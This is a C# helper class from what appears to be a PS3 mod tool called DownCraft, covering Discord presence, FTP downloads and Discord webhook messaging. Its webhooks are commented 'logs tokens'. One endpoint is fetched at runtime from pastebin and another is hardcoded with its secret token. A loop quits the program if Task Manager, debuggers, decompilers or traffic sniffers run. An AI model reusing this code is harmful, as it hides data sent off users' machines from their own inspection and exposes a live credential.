﻿#region "Library"

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PS3Lib;
using DiscordRpcDemo;
using System.Net;
using static MisakiAulait.Misaki;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using System.Net.Http;
using Flagsec;

#endregion

namespace DownCraft
{
    public class Functions
    {
        public string DefaultName;
        private string RPC_ID = "914481604032864276";

        //LOGS WEBHOOK
        public string logs_downcraft = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/5YYpEVRz"); //logs tokens
        public string logs_downcraft_private = "https://discordapp.com/api/webhooks/1029054865755865119/Y0AIAqSLRWQBqksdFuS_xisudq86BRRBHkcNu0-TjLcVhAc8fhLG_jSOtvVcdlgjLBhn";

        private DiscordRpc.EventHandlers handlers;
        private DiscordRpc.RichPresence presence;

        public static bool CanUseMenu = false;
        public static string Username;

        public void SetDiscordRPC(string details, string state, string LargeImageText)
        {
            string[] IMG = { "fuck", "kiss", "misa", "misaaa", "misaki", "owo", "rena", "yakui", "zero" };
            string RandomIMG = IMG[new Random().Next(0, IMG.Length)];

            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize(RPC_ID, ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize(RPC_ID, ref this.handlers, true, null);
            this.presence.details = details;

            System.DateTime epoch = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
            long cur_time = (long)(System.DateTime.UtcNow - epoch).TotalSeconds;

            presence.startTimestamp = cur_time;
            this.presence.state = state;
            this.presence.largeImageKey = RandomIMG;
            this.presence.largeImageText = LargeImageText;
            DiscordRpc.UpdatePresence(ref this.presence);
        }

        public void Send_WebHook(string link, string name, string picture, string message)
        {
            Webhook hook = new Webhook(link);
            hook.Name = name;
            hook.ProfilePictureUrl = picture;

            hook.SendMessage(message);
        }
        public void SendWebookFile(string link, string name, string picture, string message, string filename, string filepath)
        {
            WebhookFile hook1 = new WebhookFile(link);
            hook1.Name = name;
            hook1.ProfilePictureUrl = picture;

            hook1.SendMessage(message, filename, filepath);
        }

        public void FTP_DOWNLOAD(string URL, string username, string password, string pathConsole, string filePC)
        {
            using (var client = new WebClient())
            {
                client.Credentials = new NetworkCredential(username, password);
                client.DownloadFile(URL + pathConsole, filePC);
            }
        }

        #region "Check Bad Process"

        public static bool BadProcess = true;
        public static void CheckBadProcess()
        {
            while (BadProcess == true)
            {
                try
                {
                    bool process1 = Process.GetProcessesByName("processhacker").Any();
                    bool process2 = Process.GetProcessesByName("taskmgr").Any();
                    bool process3 = Process.GetProcessesByName("ida").Any();
                    bool process4 = Process.GetProcessesByName("ida64").Any();
                    bool process5 = Process.GetProcessesByName("dnspy").Any();
                    bool process6 = Process.GetProcessesByName("hxd").Any();
                    bool process7 = Process.GetProcessesByName("procmon64").Any();
                    bool process8 = Process.GetProcessesByName("codecracker").Any();
                    bool process9 = Process.GetProcessesByName("idag").Any();
                    bool process10 = Process.GetProcessesByName("idaw").Any();
                    bool process11 = Process.GetProcessesByName("idaq").Any();
                    bool process12 = Process.GetProcessesByName("idau").Any();
                    bool process13 = Process.GetProcessesByName("scylla").Any();
                    bool process14 = Process.GetProcessesByName("de4dot").Any();
                    bool process15 = Process.GetProcessesByName("de4dotmodded").Any();
                    bool process16 = Process.GetProcessesByName("protection_id").Any();
                    bool process17 = Process.GetProcessesByName("ollydbg").Any();
                    bool process18 = Process.GetProcessesByName("x64dbg").Any();
                    bool process19 = Process.GetProcessesByName("x32dbg").Any();
                    bool process20 = Process.GetProcessesByName("x96dbg").Any();
                    bool process21 = Process.GetProcessesByName("x64netdumper").Any();
                    bool process22 = Process.GetProcessesByName("petools").Any();
                    bool process23 = Process.GetProcessesByName("windbg").Any();
                    bool process24 = Process.GetProcessesByName("reshacker").Any();
                    bool process25 = Process.GetProcessesByName("simpleassembly").Any();
                    bool process26 = Process.GetProcessesByName("process hacker").Any();
                    bool process27 = Process.GetProcessesByName("process monitor").Any();
                    bool process28 = Process.GetProcessesByName("qt5core").Any();
                    bool process29 = Process.GetProcessesByName("importREC").Any();
                    bool process30 = Process.GetProcessesByName("immunitydebugger").Any();
                    bool process31 = Process.GetProcessesByName("megadumper").Any();
                    bool process32 = Process.GetProcessesByName("cheatengine-x86_64").Any();
                    bool process33 = Process.GetProcessesByName("dump").Any();
                    bool process34 = Process.GetProcessesByName("dbgclr").Any();
                    bool process35 = Process.GetProcessesByName("wireshark").Any();
                    bool process36 = Process.GetProcessesByName("Fiddler Everywhere").Any();
                    bool process37 = Process.GetProcessesByName("FiddlerCap").Any();
                    bool process38 = Process.GetProcessesByName("Fiddler").Any();
                    bool process39 = Process.GetProcessesByName("JustDecompile").Any();
                    bool process40 = Process.GetProcessesByName("ILSpy").Any();

                    if (process1 || process2 || process3 || process4 || process5 || process6 || process7 || process8 || process9 || process10 || process11 || process12 || process13 || process14 || process15 || process16 || process17 || process18 || process19 || process20 || process21 || process22 || process23 || process24 || process25 || process26 || process27 || process28 || process29 || process30 || process31 || process32 || process33 || process34 || process35 || process36 || process37 || process38 || process39 || process40)
                    {
                        System.Environment.Exit(1);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
        }

        #endregion
    }
}